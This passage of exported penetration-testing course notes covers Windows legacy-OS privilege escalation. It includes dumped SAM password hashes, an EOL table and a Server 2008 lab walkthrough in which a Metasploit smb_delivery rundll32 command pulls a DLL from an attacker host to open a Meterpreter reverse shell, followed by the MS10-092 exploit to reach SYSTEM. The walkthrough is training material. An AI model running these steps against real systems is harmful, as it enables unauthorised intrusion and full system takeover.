(uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\n\n<SNIP>\n```\n\nWe may get lucky and retrieve the local administrator password hash for the target system or find an old local administrator password hash that works on other systems in the environment (both of which I have done on quite a few assessments).",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/29-Legacy Operating Systems",
    "path": "02_CPTS/17-Windows Privilege Escalation/29-Legacy Operating Systems.md",
    "title": "29 Legacy Operating Systems",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Legacy Operating Systems --- While this module primarily focuses on modern operating systems (Windows 10/Windows Server 2016), as we have seen, certain issues (i.e., vulnerable software, misconfigurat...",
    "category": "02_CPTS",
    "content": "# Legacy Operating Systems\n\n---\n\nWhile this module primarily focuses on modern operating systems (Windows 10/Windows Server 2016), as we have seen, certain issues (i.e., vulnerable software, misconfigurations, careless users, etc.) cannot be solved by merely upgrading to the latest and greatest Windows desktop and server versions. That being said, specific security improvements have been made over the years that no longer affect modern, supported versions of the Windows operating system. During our assessments, we will undoubtedly encounter legacy operating systems (especially against large organizations such as universities, hospitals/medical organizations, insurance companies, utilities, state/local government). It is essential to understand the differences and certain additional flaws that we need to check to ensure our assessments are as thorough as possible.\n\n---\n\n## End of Life Systems (EOL)\n\nOver time, Microsoft decides to no longer offer ongoing support for specific operating system versions. When they stop supporting a version of Windows, they stop releasing security updates for the version in question. Windows systems first go into an \"extended support\" period before being classified as end-of-life or no longer officially supported. Microsoft continues to create security updates for these systems offered to large organizations through custom long-term support contracts. Below is a list of popular Windows versions and their end of life dates:\n\n#### Windows Desktop - EOL Dates by Version\n\n| Version                 | Date              |\n| ----------------------- | ----------------- |\n| Windows XP              | April 8, 2014     |\n| Windows Vista           | April 11, 2017    |\n| Windows 7               | January 14, 2020  |\n| Windows 8               | January 12, 2016  |\n| Windows 8.1             | January 10, 2023  |\n| Windows 10 release 1507 | May 9, 2017       |\n| Windows 10 release 1703 | October 9, 2018   |\n| Windows 10 release 1809 | November 10, 2020 |\n| Windows 10 release 1903 | December 8, 2020  |\n| Windows 10 release 1909 | May 11, 2021      |\n| Windows 10 release 2004 | December 14, 2021 |\n| Windows 10 release 20H2 | May 10, 2022      |\n\n#### Windows Server - EOL Dates by Version\n\n|Version|Date|\n|---|---|\n|Windows Server 2003|April 8, 2014|\n|Windows Server 2003 R2|July 14, 2015|\n|Windows Server 2008|January 14, 2020|\n|Windows Server 2008 R2|January 14, 2020|\n|Windows Server 2012|October 10, 2023|\n|Windows Server 2012 R2|October 10, 2023|\n|Windows Server 2016|January 12, 2027|\n|Windows Server 2019|January 9, 2029|\n\nThis [page](https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/) has a more detailed listing of the end-of-life dates for Microsoft Windows and other products such as Exchange, SQL Server, and Microsoft Office, all of which we may run into during our assessments.\n\n---\n\n## Impact\n\nWhen operating systems are set to end of life and are no longer officially supported, there are many issues that may present themselves:\n\n|Issue|Description|\n|---|---|\n|Lack of support from software companies|Certain applications (such as web browsers and other essential applications) may cease to work once a version of Windows is no longer officially supported.|\n|Hardware issues|Newer hardware components will likely stop working on legacy systems.|\n|Security flaws|This is the big one with a few notable exceptions (such as [CVE-2020-1350](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1350) (SIGRed) or EternalBlue ([CVE-2017-0144](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0144))) which were easily exploitable and \"wormable\" security flaws which affected thousands of systems worldwide (including critical infrastructure such as hospitals). Microsoft will no longer release security updates for end-of-life systems. This could leave the systems open to remote code execution and privilege escalation flaws that will remain unpatched until the system is upgraded or retired.|\n\nIn some instances, it is difficult or impossible for an organization to upgrade or retire an end-of-life system due to cost and personnel constraints. The system may be running mission-critical software no longer supported by the original vendor. This is common in medical settings and local government, where the vendor for a critical application goes out of business or no longer provides support for an application, so the organization is stuck running it on a version of Windows XP or even Server 2000/2003. If we discover this during an assessment, it is best to discuss with the client to understand the business reasons why they cannot upgrade or retire the system(s) and suggest solutions such as strict network segmentation to isolate these systems until they can be dealt with appropriately.\n\nAs penetration testers, we will often come across legacy operating systems. Though I do not see many hosts running server 2000 or Windows XP workstations vulnerable to [MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067), they exist, and I come across them on occasion. It is more common to see a few Server 2003 hosts and 2008 hosts. When we come across these systems, they are often vulnerable to one or multiple remote code execution flaws or local privilege escalation vectors. They can be a great foothold into the environment. However, when attacking them, we should always check with the client to ensure they are not fragile hosts running mission-critical applications that could cause a massive outage. There are several security protections in newer Windows operating system versions that do not exist in legacy versions, making our privilege escalation tasks much more straightforward.\n\nThere are some notable differences among older and newer versions of Windows operating system versions. While this module aims to teach local privilege escalation techniques that can be used against modern Windows OS versions, we would be remiss in not going over some of the key differences between the most common versions. The core of the module focuses on various versions of Windows 10, Server 2016, and 2019, but let's take a trip down memory lane and analyze both a Windows 7 and a Server 2008 system from the perspective of a penetration tester with the goal of picking out key differences that are crucial during assessments of large environments.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/30-Windows Server",
    "path": "02_CPTS/17-Windows Privilege Escalation/30-Windows Server.md",
    "title": "30 Windows Server",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Windows Server --- Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is...",
    "category": "02_CPTS",
    "content": "# Windows Server\n\n---\n\nWindows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.\n\n---\n\n## Server 2008 vs. Newer Versions\n\nThe table below shows some notable differences between Server 2008 and the latest Windows Server versions.\n\n|Feature|Server 2008 R2|Server 2012 R2|Server 2016|Server 2019|\n|---|---|---|---|---|\n|[Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection)||||X|\n|[Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)|Partial|Partial|X|X|\n|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)|||X|X|\n|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)|||X|X|\n|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)|||X|X|\n|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|X|X|\n|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|Partial|X|X|\n|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)|||X|X|\n\n---\n\n## Server 2008 Case Study\n\nOften during my assessments, I come across legacy operating system versions, both Windows and Linux. Sometimes these are merely forgotten systems that the client can quickly act on and decommission, while other times, these can be critical systems that can not be easily removed or replaced. Penetration testers need to understand the client's core business and hold discussions during the assessment, especially when dealing with scanning/enumeration and attacking legacy systems, and during the reporting phase. Not every environment is the same, and we must take many factors into account when writing recommendations for findings and assigning risk ratings. For example, medical settings may be running mission-critical software on Windows XP/7 or Windows Server 2003/2008 systems. Without understanding the reasoning \"why,\" it is not good enough to merely tell them to remove the systems from the environment. If they are running costly MRI software that the vendor no longer supports, it could cost large sums of money to transition to new systems. In this case, we would have to look at other mitigating controls the client has in place, such as network segmentation, custom extended support from Microsoft, etc.\n\nIf we are assessing a client with the latest and greatest protections and find one Server 2008 host that was missed, then it may be as simple as recommending to upgrade or decommission. This could also be the case in environments subject to stringent audit/regulatory requirements where a legacy system could get them a \"failing\" or low score on their audit and even hold up or force them to lose government funding.\n\nLet's take a look at a Windows Server 2008 host that we may uncover in a medical setting, large university, or local government office, among others.\n\nFor an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target. If an exploit exists in the Metasploit framework for the given missing patch, the tool will suggest it. Other enumeration scripts can assist us with this, or we can even enumerate the patch level manually and perform our own research. This may be necessary if there are limitations in loading tools on the target host or saving command output.\n\n#### Querying Current Patch Level\n\nLet's first use WMI to check for missing KBs.\n\n```cmd-session\nC:\\htb> wmic qfe\n\nCaption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status\nhttp://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\\Administrator  3/31/2021\n```\n\nA quick Google search of the last installed hotfix shows us that this system is very far out of date.\n\n#### Running Sherlock\n\nLet's run Sherlock to gather more information.\n\n```powershell-session\nPS C:\\htb> Set-ExecutionPolicy bypass -Scope process\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose\nyou to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution\npolicy?\n[Y] Yes  [N] No  [S] Suspend  [?] Help (default is \"Y\"): Y\n\n\nPS C:\\htb> Import-Module .\\Sherlock.ps1\nPS C:\\htb> Find-AllVulns\n\nTitle      : User Mode to Ring (KiTrap0D)\nMSBulletin : MS10-015\nCVEID      : 2010-0232\nLink       : https://www.exploit-db.com/exploits/11199/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : Task Scheduler .XML\nMSBulletin : MS10-092\nCVEID      : 2010-3338, 2010-3888\nLink       : https://www.exploit-db.com/exploits/19930/\nVulnStatus : Appears Vulnerable\n\nTitle      : NTUserMessageCall Win32k Kernel Pool Overflow\nMSBulletin : MS13-053\nCVEID      : 2013-1300\nLink       : https://www.exploit-db.com/exploits/33213/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : TrackPopupMenuEx Win32k NULL Page\nMSBulletin : MS13-081\nCVEID      : 2013-3881\nLink       : https://www.exploit-db.com/exploits/31576/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : TrackPopupMenu Win32k Null Pointer Dereference\nMSBulletin : MS14-058\nCVEID      : 2014-4113\nLink       : https://www.exploit-db.com/exploits/35101/\nVulnStatus : Not Vulnerable\n\nTitle      : ClientCopyImage Win32k\nMSBulletin : MS15-051\nCVEID      : 2015-1701, 2015-2433\nLink       : https://www.exploit-db.com/exploits/37367/\nVulnStatus : Appears Vulnerable\n\nTitle      : Font Driver Buffer Overflow\nMSBulletin : MS15-078\nCVEID      : 2015-2426, 2015-2433\nLink       : https://www.exploit-db.com/exploits/38222/\nVulnStatus : Not Vulnerable\n\nTitle      : 'mrxdav.sys' WebDAV\nMSBulletin : MS16-016\nCVEID      : 2016-0051\nLink       : https://www.exploit-db.com/exploits/40085/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : Secondary Logon Handle\nMSBulletin : MS16-032\nCVEID      : 2016-0099\nLink       : https://www.exploit-db.com/exploits/39719/\nVulnStatus : Appears Vulnerable\n\nTitle      : Windows Kernel-Mode Drivers EoP\nMSBulletin : MS16-034\nCVEID      : 2016-0093/94/95/96\nLink       : https://github.com/SecWiki/windows-kernel-exploits/thttps://us-cert.cisa.gov/ncas/alerts/aa20-133aree/master/MS16-034?\nVulnStatus : Not Vulnerable\n\nTitle      : Win32k Elevation of Privilege\nMSBulletin : MS16-135\nCVEID      : 2016-7255\nLink       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135\nVulnStatus : Not Vulnerable\n\nTitle      : Nessus Agent 6.6.2 - 6.10.3\nMSBulletin : N/A\nCVEID      : 2017-7199\nLink       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html\nVulnStatus : Not Vulnerable\n```\n\n#### Obtaining a Meterpreter Shell\n\nFrom the output, we can see several missing patches. From here, let's get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs. First, we need to obtain a `Meterpreter` reverse shell. We can do this several ways, but one easy way is using the `smb_delivery` module.\n\n```shell-session\nmsf6 exploit(windows/smb/smb_delivery) > search smb_delivery\n\nMatching Modules\n================\n   #  Name                              Disclosure Date  Rank       Check  Description\n   -  ----                              ---------------  ----       -----  -----------\n   0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery\nInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery\n\n\nmsf6 exploit(windows/smb/smb_delivery) > use 0\n\n[*] Using configured payload windows/meterpreter/reverse_tcp\n\n\nmsf6 exploit(windows/smb/smb_delivery) > show options \n\nModule options (exploit/windows/smb/smb_delivery):\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   FILE_NAME    test.dll         no        DLL file name\n   FOLDER_NAME                   no        Folder name to share (Default none)\n   SHARE                         no        Share (Default Random)\n   SRVHOST      10.10.14.3       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT      445              yes       The local port to listen on.\nPayload options (windows/meterpreter/reverse_tcp):\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\nExploit target:\n   Id  Name\n   --  ----\n   1   PSH\n\n\nmsf6 exploit(windows/smb/smb_delivery) > show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   DLL\n   1   PSH\n\n\nmsf6 exploit(windows/smb/smb_delivery) > set target 0\n\ntarget => 0\n\n\nmsf6 exploit(windows/smb/smb_delivery) > exploit \n[*] Exploit running as background job 1.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.10.14.3:4444 \n[*] Started service listener on 10.10.14.3:445 \n[*] Server started.\n[*] Run the following command on the target machine:\nrundll32.exe \\\\10.10.14.3\\lEUZam\\test.dll,0\n```\n\n#### Rundll Command on Target Host\n\nOpen a cmd console on the target host and paste in the `rundll32.exe` command.\n\n```cmd-session\nC:\\htb> rundll32.exe \\\\10.10.14.3\\lEUZam\\test.dll,0\n```\n\n#### Receiving Reverse Shell\n\nWe get a call back quickly.\n\n```shell-session\nmsf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15\n[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400\n```\n\n#### Searching for Local Privilege Escalation Exploit\n\nFrom here, let's search for the [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.\n\n```shell-session\nmsf6 exploit(windows/smb/smb_delivery) > search 2010-3338\n\nMatching Modules\n================\n   #  Name                                        Disclosure Date  Rank       Check  Description\n   -  ----                                        ---------------  ----       -----  -----------\n   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation\n   \n   \nmsf6 exploit(windows/smb/smb_delivery) use 0\n```\n\n#### Migrating to a 64-bit Process\n\nBefore using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the `smb_delivery` step.\n\n```shell-session\nmsf6 post(multi/recon/local_exploit_suggester) > sessions -i 1\n\n[*] Starting interaction with 1...\n\nmeterpreter > getpid\n\nCurrent pid: 2268\n\n\nmeterpreter > ps\n\nProcess List\n============\n PID   PPID  Name               Arch  Session  User                    Path\n ---   ----  ----               ----  -------  ----                    ----\n 0     0     [System Process]\n 4     0     System\n 164   1800  VMwareUser.exe     x86   2        WINLPE-2K8\\htb-student  C:\\Program Files (x86)\\VMware\\VMware Tools\\VMwareUser.exe\n 244   2032  winlogon.exe\n 260   4     smss.exe\n 288   476   svchost.exe\n 332   324   csrss.exe\n 376   324   wininit.exe\n 476   376   services.exe\n 492   376   lsass.exe\n 500   376   lsm.exe\n 584   476   mscorsvw.exe\n 600   476   svchost.exe\n 616   476   msdtc.exe\n 676   476   svchost.exe\n 744   476   taskhost.exe       x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\System32\\taskhost.exe\n 756   1800  VMwareTray.exe     x86   2        WINLPE-2K8\\htb-student  C:\\Program Files (x86)\\VMware\\VMware Tools\\VMwareTray.exe\n 764   476   svchost.exe\n 800   476   svchost.exe\n 844   476   svchost.exe\n 900   476   svchost.exe\n 940   476   svchost.exe\n 976   476   spoolsv.exe\n 1012  476   sppsvc.exe\n 1048  476   svchost.exe\n 1112  476   VMwareService.exe\n 1260  2460  powershell.exe     x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n 1408  2632  conhost.exe        x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\System32\\conhost.exe\n 1464  900   dwm.exe            x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\System32\\dwm.exe\n 1632  476   svchost.exe\n 1672  600   WmiPrvSE.exe\n 2140  2460  cmd.exe            x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\System32\\cmd.exe\n 2256  600   WmiPrvSE.exe\n 2264  476   mscorsvw.exe\n 2268  2628  rundll32.exe       x86   2        WINLPE-2K8\\htb-student  C:\\Windows\\SysWOW64\\rundll32.exe\n 2460  2656  explorer.exe       x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\explorer.exe\n 2632  2032  csrss.exe\n 2796  2632  conhost.exe        x64   2        WINLPE-2K8\\htb-student  C:\\Windows\\System32\\conhost.exe\n 2876  476   svchost.exe\n 3048  476   svchost.exe\n \n \nmeterpreter > migrate 2796\n\n[*] Migrating from 2268 to 2796...\n[*] Migration completed successfully.\n\n\nmeterpreter > background\n\n[*] Backgrounding session 1...\n```\n\n#### Setting Privilege Escalation Module Options\n\nOnce this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session, setting our tun0 IP for the LHOST, and a call-back port of our choosing.\n\n```shell-session\nmsf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1\n\nSESSION => 1\n\n\nmsf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3\n\nlhost => 10.10.14.3\n\n\nmsf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443\n\nlport => 4443\n\n\nmsf6 exploit(windows/local/ms10_092_schelevator) > show options\n\nModule options (exploit/windows/local/ms10_092_schelevator):\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   CMD                        no        Command to execute instead of a payload\n   SESSION   1                yes       The session to run this module on.\n   TASKNAME                   no        A name for the created task (default random)\nPayload options (windows/meterpreter/reverse_tcp):\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)\n   LPORT     4443             yes       The listen port\nExploit target:\n   Id  Name\n   --  ----\n   0   Windows Vista, 7, and 2008\n```\n\n#### Receiving Elevated Reverse Shell\n\nIf all goes to plan, once we type `exploit`, we will receive a new Meterpreter shell as the `NT AUTHORITY\\SYSTEM` account and can move on to perform any necessary post-exploitation.\n\n```shell-session\nmsf6 exploit(windows/local/ms10_092_schelevator) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.3:4443\n[*] Preparing payload at C:\\Windows\\TEMP\\uQEcovJYYHhC.exe\n[*] Creating task: isqR4gw3RlxnplB\n[*] SUCCESS: The scheduled task \"isqR4gw3RlxnplB\" has successfully been created.\n[*] SCHELEVATOR\n[*] Reading the task file contents from C:\\Windows\\system32\\tasks\\isqR4gw3RlxnplB...\n[*] Original CRC32: 0x89b06d1a\n[*] Final CRC32: 0x89b06d1a\n[*] Writing our modified content back...\n[*] Validating task: isqR4gw3RlxnplB\n[*]\n[*] Folder: \\\n[*] TaskName                                 Next Run Time          Status\n[*] ======================================== ====================== ===============\n[*] isqR4gw3RlxnplB                          6/1/2021 1:04:00 PM    Ready\n[*] SCHELEVATOR\n[*] Disabling the task...\n[*] SUCCESS: The parameters of scheduled task \"isqR4gw3RlxnplB\" have been changed.\n[*] SCHELEVATOR\n[*] Enabling the task...\n[*] SUCCESS: The parameters of scheduled task \"isqR4gw3RlxnplB\" have been changed.\n[*] SCHELEVATOR\n[*] Executing the task...\n[*] Sending stage (175174 bytes) to 10.129.43.15\n[*] SUCCESS: Attempted to run the scheduled task \"isqR4gw3RlxnplB\".\n[*] SCHELEVATOR\n[*] Deleting the task...\n[*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400\n[*] SUCCESS: The scheduled task \"isqR4gw3RlxnplB\" was successfully deleted.\n[*] SCHELEVATOR\n\n\nmeterpreter > getuid\n\nServer username: NT AUTHORITY\\SYSTEM\n\n\nmeterpreter > sysinfo\n\nComputer        : WINLPE-2K8\nOS              : Windows 2008 R2 (6.1 Build 7600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 3\nMeterpreter     : x86/windows\n```\n\n---\n\n## Attacking Server 2008\n\nTaking the enumeration examples we have gone through in this module, access the system below, find one way to escalate to `NT AUTHORITY\\SYSTEM` level access (there may be more than one way), and submit the `flag.txt` file on the Administrator desktop. Challenge yourself to escalate privileges multiple ways and don't merely reproduce the Task Scheduler privilege escalation detailed above.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/31-Windows Desktop Versions",
    "path": "02_CPTS/17-Windows Privilege Escalation/31-Windows Desktop Versions.md",
    "title": "31 Windows Desktop Versions",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Windows Desktop Versions --- Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments. --- Windows 7 vs. Newer Versions Over the years, Microsoft has added enhanced...",
    "category": "02_CPTS",
    "content": "# Windows Desktop Versions\n\n---\n\nWindows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.\n\n---\n\n## Windows 7 vs. Newer Versions\n\nOver the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. The table below shows some notable differences between Windows 7 and Windows 10.\n\n|Feature|Windows 7|Windows 10|\n|---|---|---|\n|[Microsoft Password (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/)||X|\n|[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview)|Partial|X|\n|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)||X|\n|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)||X|\n|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)||X|\n|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|\n|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|X|\n|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)||X|\n\n---\n\n## Windows 7 Case Study\n\nTo this date, estimates state that there may be over 100 million users still on Windows 7. According to [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), as of November 2020, Windows 7 was the second most used desktop operating system after Windows 10. Windows 7 is standard in large companies across the education, retail, transportation, healthcare, financial, government, and manufacturing sectors.\n\nAs discussed in the last section, as penetration testers, we must understand our clients' core business, risk appetite, and limitations that may prevent them from entirely moving off all versions of EOL systems such as Windows 7. It is not good enough for us to merely give them a finding for an EOL system with the recommendation of upgrading/decommissioning without any context. We should have ongoing discussions with our clients during our assessments to gain an understanding of their environment. Even if we can attack/escalate privileges on a Windows 7 host, there may be steps that a client can take to limit exposure until they can move off the EOL system(s).\n\nA large retail client may have Windows 7 embedded devices in 100s of their stores running their point of sale (POS) systems. It may not be financially feasible for them to upgrade them all at once, so we may need to work with them to develop solutions to mitigate the risk. A large law firm with one old Windows 7 system may be able to upgrade immediately or even remove it from the network. Context is important.\n\nLet's look at a Windows 7 host that we may uncover in one of the sectors mentioned above. For our Windows 7 target, we can use `Sherlock` again like in the Server 2008 example, but let's take a look at [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)\n\n#### Install Python Dependencies (local VM only)\n\nThis tool works on the Pwnbox, but to get it working on a local version of Parrot, we need to do the following to install the necessary dependencies.\n\nWindows Desktop Versions\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz\ndrxh3kr@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz\ndrxh3kr@htb[/htb]$ cd setuptools-2.0/\ndrxh3kr@htb[/htb]$ sudo python2.7 setup.py install\n\ndrxh3kr@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz\ndrxh3kr@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz\ndrxh3kr@htb[/htb]$ cd xlrd-1.0.0/\ndrxh3kr@htb[/htb]$ sudo python2.7 setup.py install\n```\n\n#### Gathering Systeminfo Command Output\n\nOnce this is done, we need to capture the `systeminfo` command's output and save it to a text file on our attack VM.\n\nWindows Desktop Versions\n\n```cmd-session\nC:\\htb> systeminfo\n\nHost Name:                 WINLPE-WIN7\nOS Name:                   Microsoft Windows 7 Professional\nOS Version:                6.1.7601 Service Pack 1 Build 7601\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Workstation\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          mrb3n\nRegistered Organization:\nProduct ID:                00371-222-9819843-86644\nOriginal Install Date:     3/25/2021, 7:23:47 PM\nSystem Boot Time:          5/13/2021, 5:14:12 PM\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               x64-based PC\nProcessor(s):              2 Processor(s) Installed.\n                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz\n                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz\nBIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018\nWindows Directory:         C:\\Windows\n\n<SNIP>\n```\n\n#### Updating the Local Microsoft Vulnerability Database\n\nWe then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file.\n\nWindows Desktop Versions\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python2.7 windows-exploit-suggester.py --update\n```\n\n#### Running Windows Exploit Suggester\n\nOnce this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws.\n\nWindows Desktop Versions\n\n```shell-session\ndrxh3kr@htb[/htb]$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt \n\n[*] initiating winsploit version 3.3...\n[*] database file detected as xls or xlsx based on extension\n[*] attempting to read from the systeminfo input file\n[+] systeminfo input file read successfully (utf-8)\n[*] querying database file for potential vulnerabilities\n[*] comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits\n[*] there are now 386 remaining vulns\n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n[+] windows version identified as 'Windows 7 SP1 64-bit'\n[*] \n[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important\n[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)\n[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)\n[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255\n[*] \n[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important\n[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)\n[*] \n[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important\n[*]   https://github.com/foxglovesec/RottenPotato\n[*]   https://github.com/Kevin-Robertson/Tater\n[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege\n[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation\n[*] \n[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important\n[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC\n[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC\n[*] \n[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical\n[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector 